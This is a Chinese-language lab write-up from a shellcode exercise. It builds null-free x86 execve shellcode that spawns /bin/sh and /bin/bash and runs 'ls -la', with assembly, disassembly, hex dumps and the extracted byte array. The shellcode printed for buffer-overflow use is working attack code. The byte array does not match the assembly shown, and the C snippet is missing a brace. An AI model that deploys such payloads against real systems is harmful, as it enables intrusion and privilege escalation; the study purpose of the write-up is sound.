# Task 1.a

首先来看一下C语言版本的shellcode：

```c
#include <unistd.h>
int main()
    char *argv[2];
    argv[0]="/bin/sh";
    argv[1]=NULL;
    execve (argv[0],argv,NULL);
	return 0;
}
```

下面汇编代码可以启动一个shell：

```asm
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

几点解释：

- 

使用nasm 编译上面的汇编代码(mysh.s) 

```
$ nasm -f elf32 mysh.s -o mysh.o
```

> nasm 是用于 Intel x86和 x64架构的汇编和反汇编程序。-f elf32选项表明我们希望将代码编译为32位 ELF 二进制格式

掏出程序的生命周期图，可以更好的理解nasm工作原理

![](https://gls.show/image/31h00bitb5.jpg)

通过链接得到可执行文件：

```shell
$ ld -m elf_i386 mysh.o -o mysh
```

可以通过`./mysh`启动shell，然后使用`echo $$`得到目前进程的id，从而验证是否成功开启了shell

接下来，我们需要从可执行文件或目标文件中提取机器代码（machine code）

```shell
$ objdump -Mintel --disassemble mysh.o

mysh.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	68 2f 2f 73 68       	push   0x68732f2f
   8:	68 2f 62 69 6e       	push   0x6e69622f
   d:	89 e3                	mov    ebx,esp
   f:	50                   	push   eax
  10:	53                   	push   ebx
  11:	89 e1                	mov    ecx,esp
  13:	31 d2                	xor    edx,edx
  15:	31 c0                	xor    eax,eax
  17:	b0 0b                	mov    al,0xb
  19:	cd 80                	int    0x80
```

- -Mintel表示显示Intel格式的汇编代码，而非默认的ATT格式
- --disassemble表示反汇编，也可以使用-d代替

可以使用xxd命令获取二进制序列

```shell
$ xxd -p -c 20 mysh.o

7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
100100001b000000000000000000000010000000
0000000007000000030000000000000000000000
3001000021000000000000000000000001000000
0000000011000000020000000000000000000000
6001000040000000040000000300000004000000
1000000019000000030000000000000000000000
a00100000f000000000000000000000001000000
00000000000000000000000031c050682f2f7368
682f62696e89e3505389e131d231c0b00bcd8000
00000000002e74657874002e7368737472746162
002e73796d746162002e73747274616200000000
0000000000000000000000000000000000000000
0000000000000000010000000000000000000000
0400f1ff00000000000000000000000003000100
08000000000000000000000010000100006d7973
682e73005f73746172740000
```

- -p表示列之间不需要空格
- -c 20表示一行有20个字符

提取出我们需要的二进制序列：

```
31c050682f2f7368
682f62696e89e3505389e131d231c0b00bcd80
```

可以使用conver.py得到二进制数组

```shell 
$ ./convert.py
Length of the shellcode: 35
shellcode= (
    "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    "\x0b\xcd\x80"
).encode(’latin-1’)
```

# Task 1.b

> Shellcode 广泛应用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制引起的，例如 strcpy ()函数。对于这些字符串复制函数，零被认为是字符串的末尾。因此，如果我们在 shell 代码的中间有一个零，字符串复制将不能将零后面的任何内容从这个 shell 代码复制到目标缓冲区，因此攻击将不能成功

因此我们有必要将上面二进制序列的0去除

一些去0的方法：

- 使用`xor eax，eax`去取代`mov eax, 0`

- 如果我们要存储0x0000099到 eax。我们不能只使用 mov eax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零

  - 首先将 eax 设置为零，然后为 al 寄存器分配一个1字节的数字0x99

- 使用移位操作

  - 下面操作等价于将`xyz\0`赋给ebx

  ```asm
  mov ebx, "xyz#"
  shl ebx, 8
  shr ebx, 8
  ```

接下来到了第一个任务，我们需要执行/bin/bash，并且不可以有多余的/

```asm
section .text

  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string
        mov ebx,"hhhh"
        shl ebx, 24
        shr ebx, 24
        push ebx
      push "/bas"
      push "/bin"
      mov  ebx, esp     ; Get the string address
      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

- 我们需要构造出/bin/bash\0的字符串
- 由于直接使用0会导致strcpy失败，因此可以使用移位操作获取0
- 注意到push的操作数只能是32位/64数

反汇编看一下结果，没有0字节

```
00000000 <_start>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	bb 68 68 68 68       	mov    ebx,0x68686868
   8:	c1 e3 18             	shl    ebx,0x18
   b:	c1 eb 18             	shr    ebx,0x18
   e:	53                   	push   ebx
   f:	68 2f 62 61 73       	push   0x7361622f
  14:	68 2f 62 69 6e       	push   0x6e69622f
  19:	89 e3                	mov    ebx,esp
  1b:	50                   	push   eax
  1c:	53                   	push   ebx
  1d:	89 e1                	mov    ecx,esp
  1f:	31 d2                	xor    edx,edx
  21:	31 c0                	xor    eax,eax
  23:	b0 0b                	mov    al,0xb
  25:	cd 80                	int    0x80
```

# Task 1.c

使用execve实现以下命令的执行：

```shell
/bin/sh -c "ls -la"
```

汇编代码：

```asm
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
        push eax

        mov eax,"##al"
        shr eax,16
        push eax

        mov eax,"ls -"
        push eax
        mov  ecx,esp ;store ls -al into ecx

        xor eax,eax
        push eax
        mov eax,"##-c"
        shr eax,16
        push eax
        mov edx,esp ;store -c into edx

        xor eax,eax
        push eax ; 0 terminate
        push ecx ; ls -al
        push edx ; -c 
        push ebx ; /bin/sh
        mov ecx,esp

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

> Invoking execve(“/bin/sh”, argv, 0)
>
> – **eax** = 0x0b: execve() system call number
>
> –**ebx** = address of the command string “/bin/sh”
>
> –**ecx** = address of the argument array argv
>
> –**edx** = address of environment variables (set to 0)

# Task 2: Using Code Segment

